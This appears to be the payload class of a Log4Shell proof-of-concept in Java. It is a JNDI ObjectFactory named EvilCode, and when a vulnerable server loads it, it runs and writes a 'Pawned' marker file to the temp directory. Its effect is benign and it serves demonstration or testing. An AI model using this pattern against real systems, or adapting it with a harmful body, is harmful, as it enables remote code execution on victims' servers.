package log4shell.hacker.injection;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.FileWriter;
import java.nio.file.Path;
import java.time.LocalTime;
import java.util.Hashtable;

public class EvilCode implements ObjectFactory {

    public static final Path TMP_FILE_PATH = Path.of(System.getProperty("java.io.tmpdir"), "log4shell.txt");

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("I am hacker code and I was executed.");
        System.out.println("As example it creates file on victim's host (localhost)");

        try(FileWriter writer = new FileWriter(TMP_FILE_PATH.toFile())){
            writer.write("Pawned at " + LocalTime.now());
        }

        return "Pawned!";
    }
}